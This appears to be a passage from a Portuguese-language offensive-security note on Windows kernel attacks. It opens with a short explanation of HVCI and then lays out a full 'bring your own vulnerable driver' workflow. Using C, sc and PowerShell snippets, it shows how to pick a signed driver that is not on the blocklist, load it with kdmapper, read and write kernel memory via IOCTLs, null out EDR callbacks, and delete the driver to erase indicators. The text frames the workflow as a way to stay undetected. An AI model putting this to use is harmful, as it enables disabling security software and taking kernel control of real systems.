# CodeIntegrityPolicyEnforcementStatus: 2 = enforçado pelo hypervisor

# Via msinfo32 — "Device Guard Virtualization Based Security"
msinfo32.exe

# Via Registry
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" `
    -Name Enabled
```

### Driver Signing + HVCI — Cadeia Completa

```
Boot com Secure Boot ativo
        │
Bootloader verifica assinatura do kernel (ntoskrnl.exe)
        │
Hyper-V é iniciado → cria VTL 0 e VTL 1
        │
Secure Kernel (securekernel.exe) em VTL 1 inicializa KMCI
        │
KMCI (Kernel Mode Code Integrity) em VTL 1 valida drivers antes do load
        │
DSE (Driver Signature Enforcement) em VTL 0 não pode ser desabilitado via R/W
porque o enforcement real ocorre em VTL 1
```

Isso é por que "patchear ci.dll em memória" para desabilitar DSE **falha com HVCI** — a verificação de assinatura real foi movida para o Secure Kernel.

---

## BYOVD Pattern Completo — Fluxo de Implementação

### Por Que Implementar BYOVD do Zero

Ferramentas prontas (EDRSandblast, Backstab) têm hashes conhecidos e são queimadas rapidamente. Construir BYOVD custom com driver novo (IOCTL analisado manualmente) permanece funcional por mais tempo.

### 1. Selecionar Driver Vulnerável

Critérios:
- Assinado por fabricante confiável (EV cert ou Microsoft WHQL).
- Expõe IOCTL com leitura/escrita arbitrária de memória kernel.
- Hash ainda não em lista blocklist KB5020023 ou Windows Vulnerable Driver Blocklist.

Fontes: LOLDrivers.io, DriverQueryDB, análise de drivers de jogos (anti-cheat comum = IOCTL-heavy).

### 2. Analisar IOCTLs (IOCTL Reverse Engineering)

```c
// Encontrar IOCTLs em driver (IDA Pro / Ghidra)
// DeviceIoControl flow: IRP_MJ_DEVICE_CONTROL → dispatch table

// Estrutura típica de IOCTL de memória
struct RWRequest {
    PVOID  pTarget;   // endereço kernel alvo
    PVOID  pBuf;      // buffer user-space
    SIZE_T size;
};
```

Ferramenta: **ioctlbf** (IOCTL brute-force scanner) ou manual via `WinObjEx64`.

### 3. Driver Loading (kdmapper ou OSR Driver Loader)

```c
// kdmapper — mapear driver sem Device Manager (sem `NtLoadDriver`)
// Usa Intel Network Adapter Diagnostic Driver como loader
kdmapper.exe vulnerable.sys

// Ou via Service + SC (detectável)
sc create vuln type= kernel binPath= C:\vuln.sys
sc start vuln
```

kdmapper bypassa DSE (Driver Signature Enforcement) em x64 Windows sem Secure Boot/HVCI.

### 4. R/W Kernel via IOCTL

```c
#define VULN_IOCTL_READ  0xDEAD1234
#define VULN_IOCTL_WRITE 0xDEAD1235

// Abrir device do driver carregado
HANDLE hDev = CreateFileA("\\\\.\\VulnDevice",
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);

// Ler memória kernel (ex: EPROCESS de SYSTEM)
struct { PVOID src; PVOID dst; SIZE_T sz; } req;
req.src = pKernelAddress;
req.dst = pLocalBuffer;
req.sz  = 0x200;
DeviceIoControl(hDev, VULN_IOCTL_READ, &req, sizeof(req),
                &req, sizeof(req), &BytesRet, NULL);

// Escrever (ex: patch callback table)
req.src = pLocalPatch;
req.dst = pCallbackTable;
req.sz  = sizeof(PVOID);
DeviceIoControl(hDev, VULN_IOCTL_WRITE, &req, sizeof(req),
                &req, sizeof(req), &BytesRet, NULL);
```

### 5. Desabilitar Callbacks EDR

Com R/W kernel, localizar e zergar callbacks:

```c
// PsSetLoadImageNotifyRoutine — array em ntoskrnl
// PspLoadImageNotifyRoutine + índice

// Exportar endereço via nt symbol (ou hardcode offset por versão)
// PVOID* pCallbacks = (PVOID*)KernelBase + PspLoadImageNotifyRoutine_offset;
// pCallbacks[0] = NULL; // remover primeiro callback (EDR)
```

Usar **EDRSandblast-style**: enumerar callbacks via `PsSetXxx` known exports, identificar módulo owner, zergar somente EDR callbacks.

### 6. Cleanup — Descarregar Driver

```c
// Descarregar para remover IOC
sc stop vuln
sc delete vuln
DeleteFileA("C:\\vuln.sys");
```

Com kdmapper: driver mapeado sem registry entry → sc delete não necessário, mas página do driver permanece em memória até reboot.

### 7. Detectar Blocklist Antes de Usar

```powershell
# Verificar se driver está na blocklist Windows
Get-Content "C:\Windows\System32\drivers\blocklist.xml" | Select-String "VulnDriver"

# Verificar HVCI (se ativo, qualquer driver não WHQL bloqueado)
(Get-CimInstance -ClassName Win32_DeviceGuard).CodeIntegrityPolicyEnforcementStatus
```

Se `HVCI = 1`, BYOVD com driver não aprovado falha em carregamento.

---

## Módulos Relacionados

`02_kernel_callbacks_e_etw.md` detalha o que desativar após obter R/W kernel — callbacks de processo, thread e imagem que alimentam EDRs, e os providers ETW que geram telemetria. `03_credential_guard_bypass.md` usa BYOVD como vetor para bypass de PPL e Credential Guard. `../04_evasao/06_edr_telemetria_e_hooking.md` cobre evasão de EDR em userland — complemento ao BYOVD quando Ring 0 não está disponível. ATT&CK T1014 (Rootkit), T1068 (Exploitation for Privilege Escalation) e T1562.001 (Disable or Modify Tools) mapeiam as técnicas desta nota.
- T1562.006 — Impair Defenses: Indicator Blocking
